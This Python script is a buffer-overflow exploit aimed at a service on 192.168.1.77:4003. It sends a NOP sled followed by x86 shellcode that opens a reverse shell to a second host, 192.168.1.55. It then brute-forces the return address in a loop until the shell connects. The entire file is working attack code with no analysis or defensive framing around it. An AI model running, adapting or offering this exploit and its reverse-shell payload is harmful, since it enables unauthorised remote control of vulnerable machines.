#!/usr/bin/env python3 

import time
import socket 
import sys
from struct import *

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.77" 
port = 4003

s.connect((host, port))


# The message with everything except for the address, which will be added in the loop
message2 = b"19|19-FfiI1xN70razCspOm8YeUg-19|" + b"\x90"*272 + b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\xc0\xa8\x01\x37\x66\x68\x05\x35\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" 


# Address to start guessing, and then work way down by length of < no-op sled 
start = 0xffffffff
counter = 0

while start >= 0:
    cpy_addr = hex(start)
    
    # convert address to hex and then get each byte, so can be cycled through 
    cpy_addr = cpy_addr[2:]
    first_hex = cpy_addr[:2]
    second_hex = cpy_addr[2:4]
    third_hex = cpy_addr[4:6]
    fourth_hex = cpy_addr[6:8]

    # Convert to int 
    first_int = int(first_hex, 16)
    second_int = int(second_hex, 16)
    third_int = int(third_hex, 16)
    fourth_int = int(fourth_hex, 16)

    # Get the actual bytes, in b'\xff\xff\xff\x7a' or whatever the address will be 
    return_addr = pack('h', first_int)[0:1] + pack('h', second_int)[0:1] + pack('h', third_int)[0:1] + pack('h', fourth_int)[0:1]

    # Append the address a bunch so that it is overwritten 
    message_to_send = message2 + return_addr*40 
    
    # Make a new socket and send the message 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(message_to_send)

    # Decriment the address by about half the no-op sled, sleep for a few milliseconds, then get and print the output which should be 
    # an empty bytes string as the input makes the program crash, but will give a reverse shell when the address is within the no-op sled 
    start -= 150
    time.sleep(0.003)
    output = s.recv(2048)
    print(output)
sys.exit(0)


